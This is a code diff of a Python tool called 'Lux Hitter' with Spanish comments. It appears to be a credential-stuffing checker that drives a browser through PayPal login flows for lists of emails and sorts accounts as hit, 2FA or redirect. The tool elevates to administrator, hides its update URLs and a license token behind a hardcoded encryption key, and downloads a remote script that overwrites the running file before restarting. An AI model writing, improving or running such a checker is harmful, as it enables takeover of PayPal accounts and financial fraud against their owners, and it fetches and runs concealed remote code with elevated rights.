@@ -23,14 +23,12 @@ import tempfile
 from cryptography.fernet import Fernet
 import shutil
 
-# Verificar permisos de administrador
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
 
-# Ejecutar el script como administrador
 def run_as_admin():
     if not is_admin():
         print("Requesting administrator privileges...")
@@ -39,6 +37,7 @@ def run_as_admin():
         )
         sys.exit()
 
+# Llama a la función al inicio del script
 run_as_admin()
 
 # Clave de encriptación hardcoded
@@ -52,18 +51,17 @@ encrypted_script_url = b'gAAAAABmz2Ry_TI_y-LvAbXtFYfIWbvGW20vSJ0a95B9E7eHJXn2DqW
 encrypted_cryptolens_token = b'gAAAAABmz2Ry6NwY4pfT-nBwKlXVyZyMDxFYTLuH6XS_doAQdkGCjynR4x4K-Cukt-0J2NS9o-CHEgYpwO8gP3-QXXV-QQx67qsDwySaamtIwZA5X6FAS_fNFzmn4GB_kyIZuF_OxktQIYMUtnEK7ugpvr_e1xt15kBL2CYa5RrPGioMqLH1CZw='
 encrypted_product_id = b'gAAAAABmz2RyZE8MG5RaeVmuemTBNfKyGd_n_1o0L9dMxGaKV0ZoZT4U7pE3jQobsyNS9lsGeqLgc6cfYuro8nWvLm29WTw5LA=='
 
-# Desencriptar URLs y credenciales
+# Desencriptar las URLs y credenciales
 VERSION_URL = cipher.decrypt(encrypted_version_url).decode()
 SCRIPT_URL = cipher.decrypt(encrypted_script_url).decode()
 CRYPTOLENS_TOKEN = cipher.decrypt(encrypted_cryptolens_token).decode()
 PRODUCT_ID = int(cipher.decrypt(encrypted_product_id).decode())
 
 LOCAL_VERSION_FILE = "version.txt"
-LOCAL_SCRIPT_FILE = sys.argv[0]  # Archivo del script actual
+LOCAL_SCRIPT_FILE = sys.argv[0]  # Obtener el nombre del archivo del script actual
+UPDATE_MARKER_FILE = "update_marker.txt"  # Archivo para marcar la actualización
 
-# Variable global para rastrear si el script ha sido actualizado
-script_updated = False
-
+# Funciones del actualizador
 def get_remote_version():
     try:
         response = requests.get(VERSION_URL)
@@ -80,21 +78,19 @@ def get_local_version():
     return "0.0.0"
 
 def update_script():
-    global script_updated
     try:
         response = requests.get(SCRIPT_URL)
         response.raise_for_status()
         
-        # Escribe en un archivo temporal primero
-        temp_file = "ReleaseKeyV2_temp.py"
-        with open(temp_file, "wb") as file:
+        # Escribe el nuevo script
+        with open(LOCAL_SCRIPT_FILE, "wb") as file:
             file.write(response.content)
         
-        # Mueve el archivo temporal al lugar del script actual
-        shutil.move(temp_file, LOCAL_SCRIPT_FILE)
+        # Crear el archivo de marcador de actualización
+        with open(UPDATE_MARKER_FILE, "w") as marker:
+            marker.write("updated")
         
         print("Script successfully updated.")
-        script_updated = True
         return True
     except requests.RequestException as e:
         print(f"Error downloading the update: {e}")
@@ -109,15 +105,21 @@ def restart_script():
     sys.exit()
 
 def check_for_updates():
+    if os.path.exists(UPDATE_MARKER_FILE):
+        # Si existe el marcador de actualización, elimínelo y no realice otra verificación
+        os.remove(UPDATE_MARKER_FILE)
+        print("Update marker found, skipping update check.")
+        return
+
     print("Checking for updates...")
-    local_version = get_local_version()
     remote_version = get_remote_version()
 
-    # Descarga y reemplaza el script independientemente de la versión
-    if update_script():
-        with open(LOCAL_VERSION_FILE, "w") as file:
-            file.write(remote_version or "0.0.0")
-        restart_script()
+    if remote_version:
+        print(f"Update available: downloading new script.")
+        if update_script():
+            with open(LOCAL_VERSION_FILE, "w") as file:
+                file.write(remote_version)
+            restart_script()
     else:
         print("No updates available.")
 
@@ -156,9 +158,6 @@ class LuxHitterApp:
         self.original_title = "Lux Hitter"
         self.set_window_title(self.original_title)
 
-    def clear_console(self):
-        os.system('cls' if os.name == 'nt' else 'clear')
-
     def set_window_title(self, title):
         safe_title = f'title "{title.replace("%", "%%").replace(":", "|")}"'
         os.system(safe_title)
@@ -176,7 +175,7 @@ class LuxHitterApp:
 
     def open_file_dialog(self, title="Select a file"):
         root = tk.Tk()
-        root.withdraw()  # Ocultar la ventana principal de Tkinter
+        root.withdraw()  # Hide the main Tkinter window
         file_path = filedialog.askopenfilename(title=title, filetypes=[("Text files", "*.txt")])
         return file_path
 
@@ -222,8 +221,8 @@ class LuxHitterApp:
             self.show_ascii_title()
 
             # Update check
-            if not script_updated:  # Prevent re-updating after a restart
-                check_for_updates()
+            print("\033[92m[LuxHitter] Starting process...\033[0m")
+            check_for_updates()
 
             # Virtual machine check
             self.check_vm()
@@ -547,11 +546,11 @@ class LuxHitterApp:
                 while True:
                     current_url = driver.current_url
                     if "paypal.com/webapps/hermes" in current_url:
-                        if time.time() - start_hermes_time > 6:
+                        if time.time() - start_hermes_time > 5:
                             self.handle_hitted_v1(driver, email)
                             break
-                    elif "paypal.com/authflow/entry" in current_url or "generic" in current_url:
-                        result = f"\033[93m2FA or Redirect: {email}\033[0m"
+                    elif "paypal.com/authflow/entry" in current_url:
+                        result = f"\033[93m2FA: {email}\033[0m"
                         self.twofa_count_v1 += 1
                         break
                     else:
@@ -624,11 +623,11 @@ class LuxHitterApp:
                 while True:
                     current_url = driver.current_url
                     if "paypal.com/webapps/hermes" in current_url:
-                        if time.time() - start_hermes_time > 6:
+                        if time.time() - start_hermes_time > 5:
                             self.handle_hitted_v2(driver, email)
                             break
-                    elif "paypal.com/authflow/entry" in current_url or "generic" in current_url:
-                        result = f"\033[93m2FA or Redirect: {email}\033[0m"
+                    elif "paypal.com/authflow/entry" in current_url:
+                        result = f"\033[93m2FA: {email}\033[0m"
                         self.twofa_count_v2 += 1
                         break
                     else:
